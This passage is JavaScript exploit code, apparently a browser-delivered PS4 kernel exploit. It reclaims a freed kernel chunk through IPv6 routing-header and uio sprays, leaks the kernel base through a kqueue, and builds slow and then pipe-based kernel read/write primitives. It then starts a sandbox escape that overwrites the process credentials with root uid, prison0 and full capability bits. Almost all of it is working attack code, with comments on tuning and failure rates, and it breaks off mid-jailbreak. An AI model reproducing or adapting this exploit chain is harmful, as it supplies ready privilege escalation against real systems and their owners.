                    if (got < 0xa0) shortRead++;

                    const fdpLo = leakDv.getUint32(0x98, true);
                    const fdpHi = leakDv.getUint32(0x9c, true);

                    const magicOk = got >= 0xa0
                        && leakDv.getUint32(8, true) === KQ_HDR_MAGIC
                        && leakDv.getUint32(12, true) === 0;
                    if (magicOk && (fdpLo !== 0 || fdpHi !== 0)) {
                        kqFd = held.pop();
                        leaked = true; break;
                    }

                    if (magicOk) magicNoFdp++;
                    if (held.length >= KQ_BATCH) {
                        while (held.length) sc(SYS.close, held.pop());
                        sc(SYS.sched_yield);
                    }
                    if (i && i % 500 === 0)
                        mark("KQUEUE-ROUND", "i=" + i + " magic_no_fdp="
                            + magicNoFdp + " short=" + shortRead);
                }

                while (held.length) sc(SYS.close, held.pop());
                check("kqueue-reclaimed-freed-chunk", leaked,
                    "tries=" + tries + " magic_no_fdp=" + magicNoFdp
                    + " short_reads=" + shortRead
                    + (leaked ? " fd=" + kqFd : ""));
                if (leaked) {
                    const klLock = new int64(leakDv.getUint32(0x60, true),
                                             leakDv.getUint32(0x64, true));
                    kqFdp = new int64(leakDv.getUint32(0x98, true),
                                      leakDv.getUint32(0x9c, true));
                    kernelBase = klLock.sub32(off.k_kl_lock);
                    mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
                    mark("KERNEL-BASE", kernelBase + " = kl_lock-0x"
                        + off.k_kl_lock.toString(16));

                    try {
                        const kbNow = "" + kernelBase;
                        const kbLast = localStorage.getItem("ps4lab_kernel_base");
                        if (kbLast === kbNow)
                            mark("SAME-BOOT-AS-LAST-RUN", "kernel_base=" + kbNow);
                        localStorage.setItem("ps4lab_kernel_base", kbNow);
                    } catch (e) { }

                    check("kl_lock-kq_fdp-kernel-pointers",
                        (klLock.hi >>> 0) === 0xffffffff
                        && (kqFdp.hi >>> 0) >= 0xffff0000,
                        "kl_lock.hi=" + hx(klLock.hi) + " kq_fdp.hi=" + hx(kqFdp.hi));
                    check("kernel-base-0x4000-aligned",
                        (kernelBase.low & 0x3fff) === 0,
                        "low=" + hx(kernelBase.low));

                    sc(SYS.close, kqFd);
                    triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", MAX_ROUNDS_TRIPLET);
                    mark("POST-KQUEUE", "kq_fd=" + kqFd + " closed triplets="
                        + triplets.join(","));
                    check("triplets2-re-found-after-kqueue-leak",
                        !!triplets[2], triplets.join(","));
                }
            }
        }

        function fakeUio(uioIov, resid, rw) {
            new Uint8Array(iovAb).fill(0);
            put(iovDv, 0x00, uioIov);
            iovDv.setUint32(0x08, NUM_UIO_IOV, true);
            put(iovDv, 0x10, -1);
            put(iovDv, 0x18, resid);
            iovDv.setUint32(0x20, UIO_SYSSPACE, true);
            iovDv.setUint32(0x24, rw, true);
            put(iovDv, 0x28, 0);
        }
        function restoreRefcntIov() {
            new Uint8Array(iovAb).fill(0);
            put(iovDv, 0, 1); put(iovDv, 8, 1);
        }

        async function landUio(size, forWrite, tasks) {
            if (!tripletsUsable()) { mark("UIO-LAND-REFUSED", "triplets="
                + triplets.join(",")); return null; }

            trace("UIO-LAND", "call=" + (forWrite ? "readv" : "writev")
                + " size=" + size);
            freeRthdr(triplets[2]);
            // ITEM 5a. landFakeUio has a deadline; this one did not, so a run
            // where the chunk is never re-taken spins all NUM_UIO_SPRAY rounds
            // and only then unwinds. Bound it the same way. poops.js:4640.
            const uioDeadline = Date.now() + (params.has("uioms")
                ? parseInt(params.get("uioms"), 10) : 30000);
            for (let i = 0; i < NUM_UIO_SPRAY; ++i) {
                if ((i & 0x3f) === 0 && Date.now() > uioDeadline) {
                    mark("UIO-LAND-TIMEOUT", "rounds=" + i);
                    break;
                }
                if (i && i % 256 === 0) mark("UIO-LAND-ROUND", "i=" + i);
                for (let k = 0; k < uioWorkers.length; ++k)
                    tasks[k] = fireW(uioWorkers[k],
                        forWrite ? SYS.readv : SYS.writev,
                        [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
                sc(SYS.sched_yield);

                if (getRthdr(triplets[0], IOVEC_SIZE) >= 0
                    && leakDv.getInt32(8, true) === NUM_UIO_IOV) {
                    return new int64(leakDv.getUint32(0, true),
                                     leakDv.getUint32(4, true));
                }
                if (forWrite) {
                    for (let k = 0; k < uioWorkers.length; ++k)
                        sc(SYS.write, uioSs[1], scratch, size);
                } else {
                    sc(SYS.read, uioSs[0], scratch, size);
                    for (let k = 0; k < uioWorkers.length; ++k)
                        sc(SYS.read, uioSs[0], scratch, size);
                }
                await Promise.all(tasks);
                if (!forWrite) sc(SYS.write, uioSs[1], scratch, size);
            }
            return null;
        }

        async function landFakeUio(tasks) {
            if (!tripletsUsable()) { mark("FAKEUIO-REFUSED", "triplets="
                + triplets.join(",")); return false; }
            trace("FAKEUIO-LAND", "target=" + triplets[0] + " freed=" + triplets[1]);
            freeRthdr(triplets[1]);

            const fakeDeadline = Date.now() + (params.has("fakeuioms")
                ? parseInt(params.get("fakeuioms"), 10) : 30000);
            for (let i = 0; i < NUM_IOV_SPRAY_MAX; ++i) {
                if ((i & 0x3f) === 0 && Date.now() > fakeDeadline) {
                    mark("FAKEUIO-TIMEOUT", "rounds=" + i);
                    break;
                }
                if (i && i % 500 === 0) mark("FAKEUIO-ROUND", "i=" + i);
                for (let k = 0; k < iovWorkers.length; ++k)
                    tasks[k] = fireW(iovWorkers[k], SYS.recvmsg,
                        [iovSs[0], msgAddr, 0], 0);
                sc(SYS.sched_yield);
                if (getRthdr(triplets[0], UIO_SIZE + IOVEC_SIZE) >= 0
                    && leakDv.getUint32(0x20, true) === UIO_SYSSPACE) return true;
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.write, iovSs[1], scratch, 1);
                await Promise.all(tasks);
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.read, iovSs[0], scratch, 1);
            }
            return false;
        }

        function tripletsUsable() {
            return triplets && triplets.length === 3
                && triplets.every(fd => fd > 0 && ipv6.indexOf(fd) >= 0);
        }

        async function releaseIov(itasks) {
            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.write, iovSs[1], scratch, 1);
            await Promise.all(itasks);
            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.read, iovSs[0], scratch, 1);
        }

        // ITEM 3. tripletsUsable() only checks the three fds are non-zero and
        // in the pool -- it never reads a single one back. Every getRthdr in
        // the race path targets the MASTER only, so a slave that is no longer
        // aliased is indistinguishable from one that is, and we then spend a
        // full UAF re-roll on it. 14 of 28 cut-off runs die at or after a
        // refind. poops.js:9381-9445 validates all three independently before
        // trusting them; this is that check.
        function tripletsAgree(why) {
            if (!tripletsUsable()) return false;
            const tags = [];
            for (const fd of triplets) {
                if (getRthdr(fd, UCRED_SIZE, 8) < 0) {
                    trace("TRIPLET-VALIDATE", why + " fd=" + fd + " short-read");
                    return false;
                }
                const v = leakDv.getUint32(4, true) >>> 0;
                if ((v & 0xffff0000) >>> 0 !== RTHDR_TAG) {
                    trace("TRIPLET-VALIDATE", why + " fd=" + fd + " untagged="
                        + hx(v));
                    return false;
                }
                tags.push(v);
            }
            // All three must be reading the SAME chunk, i.e. the same tag.
            const agree = tags[0] === tags[1] && tags[1] === tags[2];
            if (!agree)
                trace("TRIPLET-VALIDATE", why + " disagree "
                    + tags.map(hx).join(","));
            return agree;
        }

        function refindPair(tag) {
            for (let retry = 0; retry < 3; ++retry) {
                triplets[1] = findTriplet(triplets[0], -1, tag + "1",
                    FIND_TRIPLET_FAST);
                triplets[2] = findTriplet(triplets[0], triplets[1], tag + "2",
                    FIND_TRIPLET_FAST);
                if (tripletsUsable() && tripletsAgree(tag)) return true;
                sc(SYS.sched_yield);
            }
            mark("REFIND-UNVALIDATED", "tag=" + tag
                + " triplets=" + triplets.join(","));
            return false;
        }
        async function refindTriplets(itasks) {
            await releaseIov(itasks);
            if (refindPair("RE")) return true;
            mark("TRIPLETS-LOST", "triplets=" + triplets.join(","));
            return false;
        }

        async function unwind(utasks, itasks, why, wakeUio, size, drainReads) {
            mark("KREAD-UNWIND", "why=" + why + " wake_uio=" + (wakeUio ? 1 : 0));
            try {
                if (wakeUio && utasks && utasks[0]) {
                    // THE ONLY UNBOUNDED BLOCK IN THIS FILE, now bounded.
                    // uioSs is a blocking AF_UNIX socketpair -- no O_NONBLOCK,
                    // no SO_RCVTIMEO -- and sc() is a synchronous syscall on the
                    // main JS thread, so one read past the available bytes parks
                    // the WebProcess forever and the console has to be pulled.
                    //
                    // This is only reached when landUio EXHAUSTED its rounds,
                    // and every round ends with await Promise.all(tasks), so no
                    // racer is parked and there is nothing to wake. What is left
                    // is exactly the re-prefill: `size` bytes on the read side
                    // (landUio re-primes at its round tail) and NOTHING on the
                    // write side (forWrite skips that prime, and its racers are
                    // readv()-ers). So: one read, or none. Never N+1.
                    // The old code asked for (N+1)*8 and hung just as hard --
                    // it only ever survived because this path is rare.
                    const dsz = size || 8;
                    for (let k = 0; k < (drainReads || 0); ++k)
                        sc(SYS.read, uioSs[0], scratch, dsz);
                    await Promise.all(utasks);
                }
            } catch (e) { mark("UNWIND-UIO-THREW", e.message); }
            try {
                if (itasks && itasks[0]) await releaseIov(itasks);
            } catch (e) { mark("UNWIND-IOV-THREW", e.message); }
            restoreRefcntIov();
            const ok = refindPair("UW");
            mark("KREAD-UNWOUND", "triplets=" + triplets.join(",")
                + " usable=" + ok);
            return ok;
        }

        // `pairs` (optional) = [{addr,size},...] gathered into ONE forged uio.
        // `size` must be the sum. iovAb is 0x170 = [uio 0x30][20 iovec slots],
        // uio_iovcnt is already NUM_UIO_IOV (0x14), and fakeUio zero-fills, so
        // slots 1..19 are in-bounds and inert unless populated here.
        // ITEM 2. Refuse to spend a slow op on an address that cannot be a
        // kernel pointer. Without this, a kread that returned all zeros gave
        // int64(0,0) -- which is TRUTHY -- so the walk carried on and issued a
        // read at ~0x270 through a UIO_SYSSPACE uio inside writev: a near-NULL
        // kernel dereference. poops.js:4800-4807 gates the same way.
        const isKptr = v => !!v && (v.hi >>> 0) >= 0xffff0000;
        const kAligned = v => !!v && ((v.low >>> 0) & 7) === 0;
        function kaddrOk(v) { return isKptr(v) && kAligned(v); }

        async function kreadSlow(addr, size, pairs) {
            if (kreadPoisoned) { mark("KREAD-REFUSED", "reason=poisoned"); return null; }
            if (pairs) {
                for (const q of pairs) if (!kaddrOk(q.addr)) {
                    mark("KREAD-REFUSED", "bad-pair-addr=" + q.addr);
                    return null;
                }
            } else if (!kaddrOk(addr)) {
                mark("KREAD-REFUSED", "bad-addr=" + addr);
                return null;
            }
            if (!tripletsUsable()) { mark("KREAD-REFUSED", "triplets="
                + triplets.join(",")); return null; }
            if (pairs && pairs.length > NUM_UIO_IOV) {
                mark("KREAD-REFUSED", "pairs=" + pairs.length + " > " + NUM_UIO_IOV);
                return null;
            }
            mark("KREAD-BEGIN", "addr=" + (pairs
                ? pairs.map(p2 => "" + p2.addr).join("+") : addr) + " size=" + size);
            const bufs = uioWorkers.map(function () {
                const ab = new ArrayBuffer(size); keepAlive.push(ab);
                // ITEM 2. Sentinel-fill so an EMPTY read is distinguishable
                // from a real read of a zero qword. A fresh buffer is all
                // zeros, which used to sail through the hit test below and
                // return int64(0,0) as if it were kernel data.
                new Uint8Array(ab).fill(0x41);
                return { ab: ab, addr: bufAddr(ab), dv: new DataView(ab) };
            });
            lenDv.setUint32(0, size, true);
            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
            sc(SYS.write, uioSs[1], scratch, size);
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, false, utasks);
            if (!uioIov) { await unwind(utasks, null, "no-uio", true, size, 1); return null; }
            trace("UIO-LANDED", "uio_iov=" + uioIov);
            fakeUio(uioIov, size, UIO_WRITE);
            if (pairs) {
                for (let i = 0; i < pairs.length; ++i) {
                    put(iovDv, 0x30 + IOVEC_SIZE * i, pairs[i].addr);
                    put(iovDv, 0x38 + IOVEC_SIZE * i, pairs[i].size);
                }
            } else {
                put(iovDv, 0x30, addr);
                put(iovDv, 0x38, size);
            }
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) { kreadPoisoned = true;
                await unwind(utasks, itasks, "no-fake-uio", false, size);
                return null; }
            trace("KREAD-WAKE", "src=" + addr);

            sc(SYS.read, uioSs[0], scratch, size);
            let got = null, drained = 0;
            for (const b of bufs) {
                sc(SYS.read, uioSs[0], b.addr, size);
                drained++;
                if (!got
                    && !(b.dv.getUint32(0, true) === 0x41414141
                         && b.dv.getUint32(4, true) === 0x41414141)) got = b.dv;
            }
            trace("KREAD-DRAINED", "bufs=" + drained + "/" + bufs.length
                + " hit=" + (got ? 1 : 0));
            await Promise.all(utasks);
            trace("KREAD-UIO-JOINED", "");
            restoreRefcntIov();
            await refindTriplets(itasks);
            return got;
        }

        async function kwriteSlow(dst, srcAddr, size) {
            if (kreadPoisoned) { mark("KWRITE-REFUSED", "reason=poisoned"); return false; }
            if (!kaddrOk(dst)) { mark("KWRITE-REFUSED", "bad-dst=" + dst); return false; }
            if (!tripletsUsable()) { mark("KWRITE-REFUSED", "triplets="
                + triplets.join(",")); return false; }
            mark("KWRITE-BEGIN", "dst=" + dst + " size=" + size);
            lenDv.setUint32(0, size, true);
            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, true, utasks);
            if (!uioIov) { await unwind(utasks, null, "no-uio", true, size, 0); return false; }
            fakeUio(uioIov, size, UIO_READ);
            put(iovDv, 0x30, dst);
            put(iovDv, 0x38, size);
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) { kreadPoisoned = true;
                await unwind(utasks, itasks, "no-fake-uio", false, size);
                return false; }
            for (let k = 0; k < uioWorkers.length; ++k)
                sc(SYS.write, uioSs[1], srcAddr, size);
            await Promise.all(utasks);
            restoreRefcntIov();
            await refindTriplets(itasks);
            return true;
        }

        // R1. This read proves nothing the pipe primitive does not prove better,
        // and it is slow op #1 of 7 -- one full UAF re-roll at ~3.1% death for a
        // check that is repeated at :kernelview-reads-kernel-elf-header on the
        // FAST primitive, before the first kernel write. poops.js:8672 runs its
        // ELF proof on kread64Fast for exactly this reason, and poops.js:6063
        // records deleting the equivalent slow read. `kernelBase` is still
        // required below, so the gate on it stays.
        const R1_ON = params.get("r1") !== "0";
        if (!R1_ON && kernelBase && triplets) {
            state("kread_slow...", "warn");
            const got = await kreadSlow(kernelBase, 0x20);
            if (got) {
                const b = [];
                for (let i = 0; i < 16; ++i) b.push(got.getUint8(i));
                mark("KREAD", "kernel_base -> "
                    + b.map(v => v.toString(16).padStart(2, "0")).join(" "));
                check("kread_slow-reads-kernel-elf-header",
                    got.getUint32(0, true) === 0x464c457f,
                    "e_type=" + got.getUint16(0x10, true)
                    + " e_machine=" + hx(got.getUint16(0x12, true)));
            } else check("kread_slow-returned-data", false, "");
        }

        let kv = null;
        if (kernelBase && triplets && kqFdp) {
            state("make_karw...", "warn");
            mark("SHORT-READS", "n=" + shortReads + " gate=" + (R2_ON ? 1 : 0));

            const KREAD_TRIES = params.has("kreadtries")
                ? parseInt(params.get("kreadtries"), 10) : 4;
            async function kread8(a) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "addr=" + a + " try=" + (t + 1));
                    const dv = await kreadSlow(a, 8);
                    if (dv) return new int64(dv.getUint32(0, true),
                                             dv.getUint32(4, true));
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }
            async function kwrite8n(dst, srcAddr, n) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KWRITE-RETRY", "dst=" + dst + " try=" + (t + 1));
                    if (await kwriteSlow(dst, srcAddr, n)) return true;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return false;
            }
            // R3/R4 helpers. Same retry discipline as kread8 -- do NOT drop it.
            const qw = (dv, o) => new int64(dv.getUint32(o, true),
                                            dv.getUint32(o + 4, true));
            async function kreadN(a, n) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "addr=" + a + " n=" + n
                        + " try=" + (t + 1));
                    const dv = await kreadSlow(a, n);
                    if (dv) return dv;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }
            // R4. One window, two non-adjacent addresses, via extra iovec slots
            // in the forged uio. poops.js:4909-4930 buildUioPairs / :4947-5010.
            async function kreadPairs(pairs) {
                let total = 0;
                for (const p2 of pairs) total += p2.size;
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "pairs=" + pairs.length
                        + " try=" + (t + 1));
                    const dv = await kreadSlow(null, total, pairs);
                    if (dv) return dv;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }
            const R3_ON = params.get("r3") !== "0";
            const R4_ON = params.get("r4") !== "0";

            const fdtOfiles = await kread8(kqFdp);
            mark("FDT-OFILES", "" + fdtOfiles);

            // R3. mFp and sFp are FILEDESCENT_SIZE apart in one live ofiles
            // span, so one 0x20 read replaces two windows. pipe() at :387/:389
            // are back-to-back with no intervening fd allocation, so the two
            // low fds are always 2 apart -- 44/44 in the log. Verified, not
            // assumed, and it falls back if the console ever disagrees.
            let mFp = null, sFp = null;
            const fdDelta = slavePipe[0] - masterPipe[0];
            const spanOk = R3_ON && fdtOfiles && fdDelta > 0
                && (fdDelta + 1) * FILEDESCENT_SIZE <= 0x20;
            if (spanOk) {
                const span = await kreadN(
                    fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE), 0x20);
                if (span) {
                    mFp = qw(span, 0);
                    sFp = qw(span, fdDelta * FILEDESCENT_SIZE);
                } else mark("PIPE-FP-SPAN-MISS", "delta=" + fdDelta);
            }
            if (!mFp && fdtOfiles && !kreadPoisoned && tripletsUsable()) {
                if (spanOk) mark("PIPE-FP-FALLBACK", "two single reads");
                mFp = await kread8(
                    fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
                sFp = await kread8(
                    fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
            }
            mark("PIPE-FP", "master=" + (mFp || "?") + " slave=" + (sFp || "?")
                + " delta=" + fdDelta + " span=" + (spanOk ? 1 : 0));

            // R4. f_data of the two struct files: unrelated addresses, so a
            // contiguous read cannot help -- this needs the scatter.
            let mData = null, sData = null;
            if (R4_ON && mFp && sFp) {
                const both = await kreadPairs([{ addr: mFp, size: 8 },
                                               { addr: sFp, size: 8 }]);
                if (both) { mData = qw(both, 0); sData = qw(both, 8); }
                else mark("PIPE-FDATA-SCATTER-MISS", "");
            }
            if (!mData && !kreadPoisoned && tripletsUsable()) {
                if (R4_ON && mFp && sFp) mark("PIPE-FDATA-FALLBACK", "two reads");
                mData = mFp ? await kread8(mFp) : null;
                sData = sFp ? await kread8(sFp) : null;
            }
            mark("PIPE-FDATA", "master=" + (mData || "?") + " slave=" + (sData || "?"));
            const kptr = v => v && (v.hi >>> 0) >= 0xffff0000;
            // R8. Two distinct struct files cannot share f_data. Equal values
            // mean the alias was misidentified, and aiming a pipebuf at itself
            // is not something that fails cleanly. POOPS.LUA:1068 aborts here.
            if (kptr(mData) && kptr(sData)
                && mData.low === sData.low && mData.hi === sData.hi) {
                check("pipe-fdata-distinct", false, "both=" + mData);
                mark("MAKE-KARW-ABORTED", "reason=mdata-equals-sdata");
                mData = null;
            }
            if (!check("ofiles-walk-reached-pipes",
                kptr(fdtOfiles) && kptr(mFp) && kptr(sFp)
                && kptr(mData) && kptr(sData), "")) {
                mark("MAKE-KARW-ABORTED", "reason=walk-not-kernel-pointers");
            } else {

                const pbAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                keepAlive.push(pbAb);
                const pbAddr = bufAddr(pbAb), pbDv = new DataView(pbAb);
                new Uint8Array(pbAb).fill(0);
                pbDv.setUint32(0x0c, PIPE_PAGE, true);
                put(pbDv, 0x10, sData);
                mark("PIPEBUF-AIM", "at=" + mData + " size=0x"
                    + PIPE_PAGE.toString(16) + " buffer=" + sData);
                const wrote = await kwrite8n(mData, pbAddr, PIPEBUF_SIZEOF);
                check("pipebuf-written-master-struct-pipe", wrote, "");

                if (wrote) {
                    for (const fd of [masterPipe[0], masterPipe[1],
                                      slavePipe[0], slavePipe[1]])
                        sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
                    const kvBufAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                    const kvViewAb = new ArrayBuffer(0x40);
                    keepAlive.push(kvBufAb, kvViewAb);
                    const kvBufAddr = bufAddr(kvBufAb), kvBufDv = new DataView(kvBufAb);
                    const kvViewAddr = bufAddr(kvViewAb), kvViewDv = new DataView(kvViewAb);
                    new Uint8Array(kvBufAb).fill(0);
                    kvBufDv.setUint32(0x0c, PIPE_PAGE, true);
                    kv = {
                        flush: function () {
                            sc(SYS.write, masterPipe[1], kvBufAddr, PIPEBUF_SIZEOF);
                            sc(SYS.read, masterPipe[0], kvBufAddr, PIPEBUF_SIZEOF);
                        },
                        kread: function (dst, src, n) {
                            put(kvBufDv, 0x10, src);
                            kvBufDv.setUint32(0, n >>> 0, true);
                            this.flush();
                            return sc(SYS.read, slavePipe[0], dst, n).i32;
                        },
                        kwrite: function (dst, src, n) {
                            put(kvBufDv, 0x10, dst);
                            kvBufDv.setUint32(0, n >>> 0, true);
                            this.flush();
                            return sc(SYS.write, slavePipe[1], src, n).i32;
                        },
                        read8: function (a) {
                            new Uint8Array(kvViewAb).fill(0);
                            this.kread(kvViewAddr, a, 8);
                            return new int64(kvViewDv.getUint32(0, true),
                                             kvViewDv.getUint32(4, true));
                        },
                    };
                    mark("KERNELVIEW", "master=" + masterPipe + " slave=" + slavePipe);

                    new Uint8Array(kvViewAb).fill(0);
                    kv.kread(kvViewAddr, kernelBase, 0x10);
                    const hdr = [];
                    for (let i = 0; i < 16; ++i) hdr.push(kvViewDv.getUint8(i));
                    mark("KV-READ", "kernel_base -> "
                        + hdr.map(v => v.toString(16).padStart(2, "0")).join(" "));
                    const kvElfOk = check("kernelview-reads-kernel-elf-header",
                        kvViewDv.getUint32(0, true) === 0x464c457f, "");

                    const fpM2 = kv.read8(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
                    const fpS2 = kv.read8(fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
                    const same = (a, b) => a && b
                        && (a.low >>> 0) === (b.low >>> 0)
                        && (a.hi >>> 0) === (b.hi >>> 0);
                    mark("KV-FGET", "master=" + fpM2 + " kread=" + mFp
                        + " slave=" + fpS2 + " kread=" + sFp);
                    const kvAgree = check("primitives-agree-pipes-struct-file",
                        same(fpM2, mFp) && same(fpS2, sFp), "");
                    if (!kvElfOk || !kvAgree) {
                        // REPORT ONLY. Do NOT null kv and do NOT skip what
                        // follows. By this point the pipebuf forge has already
                        // been committed, and the code below -- nulling the
                        // triplets' ip6po_rthdr and removing the aliased struct
                        // file -- is exactly what lets the process exit without
                        // panicking the kernel. Gating it on a failed view
                        // turns a run that would have finished dirty-but-alive
                        // into a guaranteed panic at exit. Four independent
                        // reviewers caught this; it was my mistake.
                        mark("KERNELVIEW-SUSPECT", "elf=" + (kvElfOk ? 1 : 0)
                            + " agree=" + (kvAgree ? 1 : 0)
                            + " -- repair still runs, later stages self-gate");
                    }

                    const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
                    const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);
                    // dump scratch: kvwAb is only 0x10, and the pipebuf read
                    // needs 0x18. Separate buffers so the dump can never
                    // overflow the one the kview accessors use.
                    const dmpAb = new ArrayBuffer(0x20); keepAlive.push(dmpAb);
                    const dmpAddr = bufAddr(dmpAb), dmpDv = new DataView(dmpAb);
                    const dmpU8 = new Uint8Array(dmpAb);
                    const scanAbDump = new ArrayBuffer(0x80 * FILEDESCENT_SIZE);
                    keepAlive.push(scanAbDump);
                    const scanAddrDump = bufAddr(scanAbDump);
                    const scanDvDump = new DataView(scanAbDump);
                    function kview(base) {
                        return {
                            getBInt: function (o) {
                                return kv.read8(base.add32(o));
                            },
                            setBInt: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                put(kvwDv, 0, v);
                                kv.kwrite(base.add32(o), kvwAddr, 8);
                            },
                            getInt32: function (o) {
                                new Uint8Array(kvwAb).fill(0);
                                kv.kread(kvwAddr, base.add32(o), 4);
                                return kvwDv.getInt32(0, true);
                            },
                            setInt32: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                kvwDv.setInt32(0, v, true);
                                kv.kwrite(base.add32(o), kvwAddr, 4);
                            },
                            setUint8: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                kvwDv.setUint8(0, v);
                                kv.kwrite(base.add32(o), kvwAddr, 1);
                            },
                        };
                    }
                    const kptr2 = v => v && (v.hi >>> 0) >= 0xffff0000;
                    const fget = fd => kv.read8(
                        fdtOfiles.add32(fd * FILEDESCENT_SIZE));
                    function fput(fd, v) {
                        new Uint8Array(kvwAb).fill(0);
                        put(kvwDv, 0, v);
                        kv.kwrite(fdtOfiles.add32(fd * FILEDESCENT_SIZE), kvwAddr, 8);
                    }

                    function fhold(fp) {
                        const before = kview(fp).getInt32(0x28);
                        if (before <= 0 || before > 0xffff) return { before, after: before };
                        let after = before;
                        for (let bump = 1; bump <= 4; ++bump) {
                            kview(fp).setInt32(0x28, before + bump);
                            after = kview(fp).getInt32(0x28);
                            if (after > before && after >= 2) break;
                        }
                        return { before, after };
                    }
                    {
                        const held = [];
                        let allOk = true;
                        for (const fd of [masterPipe[0], masterPipe[1],
                                          slavePipe[0], slavePipe[1]]) {
                            const fp = fget(fd);
                            if (!kptr2(fp)) { allOk = false; held.push(fd + ":badfp"); continue; }
                            const r = fhold(fp);
                            if (!(r.after > r.before)) allOk = false;
                            held.push(fd + ":" + r.before + "->" + r.after);
                        }
                        mark("PIPE-REFCNT", held.join(" "));
                        check("four-karw-pipe-files-hold",
                            allOk, "");
                    }

                    // ITEM 1. Jailbreak BEFORE the teardown. The funnel was
                    // KERNELVIEW 44 -> CURPROC 38: six runs had working
                    // kernel R/W and died in cleanup without ever trying.
                    // Everything below needs only kv, fdtOfiles and sc, all
                    // live from here. poops.js:7273 orders it the same way.
                    //
                    // WRAPPED, and it has to be: running before the cleanup
                    // means a throw in here would skip the socket close and
                    // the alias repair and leave the console dirty. Running
                    // last, it never could.
                    let jailbreakThrew = null;
                    // Declared OUT here: the kernel patcher and the
                    // payload stage read both, and a let inside the try
                    // below would be block-scoped away from them --
                    // a runtime ReferenceError node --check cannot see.
                    let jailbroken = false, curproc = null;
                    try {
                        const FIOSETOWN = 0x8004667c;
                        const P_LIST_NEXT = 0x00, P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
                        const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
                        const CR_NGROUPS = 0x10, CR_RGID = 0x14;
                        const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
                        const FD_RDIR = 0x10, FD_JDIR = 0x18;
                        state("sandbox escape...", "warn");
                        {
                            if (sc(SYS.pipe, argAddr).i32 !== -1) {
                                const escPipe = [argDv.getInt32(0, true),
                                                 argDv.getInt32(4, true)];
                                lenDv.setUint32(0, pid, true);
                                sc(SYS.ioctl, escPipe[0], FIOSETOWN, lenAddr);
                                const escFp = fget(escPipe[0]);
                                const escData = kptr2(escFp) ? kv.read8(escFp) : null;
                                const sigio = kptr2(escData)
                                    ? kv.read8(escData.add32(0xd0)) : null;
                                curproc = kptr2(sigio) ? kv.read8(sigio) : null;
                                sc(SYS.close, escPipe[1]);
                                sc(SYS.close, escPipe[0]);
                            }
                            mark("CURPROC", "" + (curproc || "null"));
                            check("curproc-resolved-through-pipe-sigio",
                                kptr2(curproc), "" + (curproc || "null"));
                        }
                        if (kptr2(curproc)) {

                            function pfind(target) {
                                let q = kv.read8(curproc);
                                for (let n = 0; n < 4096; ++n) {
                                    if (!kptr2(q)) return null;
                                    if (kview(q).getInt32(P_PID) === target) return q;
                                    q = kv.read8(q.add32(P_LIST_NEXT));
                                }
                                return null;
                            }
                            const kProc = pfind(0);
                            const procFd = kv.read8(curproc.add32(P_FD));
                            const ucred = kv.read8(curproc.add32(P_UCRED));
                            mark("JAILBREAK-SOURCES", "kproc=" + (kProc || "null")
                                + " p_fd=" + procFd + " p_ucred=" + ucred);
                            const prison0 = kptr2(kProc)
                                ? kv.read8(kv.read8(kProc.add32(P_UCRED)).add32(CR_PRISON))
                                : null;
                            const rootVnode = kptr2(kProc)
                                ? kv.read8(kv.read8(kProc.add32(P_FD)).add32(FD_RDIR))
                                : null;
                            const srcOk = kptr2(procFd) && kptr2(ucred)
                                && kptr2(prison0) && kptr2(rootVnode);
                            mark("JAILBREAK-KSRC", "prison0=" + (prison0 || "null")
                                + " rootvnode=" + (rootVnode || "null"));
                            if (check("jailbreak-source-kernel-pointer",
                                srcOk, srcOk ? "" : "refusing to write")) {
                                kview(ucred).setInt32(CR_UID, 0);
                                kview(ucred).setInt32(CR_RUID, 0);
                                kview(ucred).setInt32(CR_SVUID, 0);
                                kview(ucred).setInt32(CR_NGROUPS, 1);
                                kview(ucred).setInt32(CR_RGID, 0);
                                kview(ucred).setBInt(CR_PRISON, prison0);
                                kview(ucred).setBInt(CR_SCECAPS1, new int64(-1, -1));
                                kview(ucred).setBInt(CR_SCECAPS0, new int64(-1, -1));
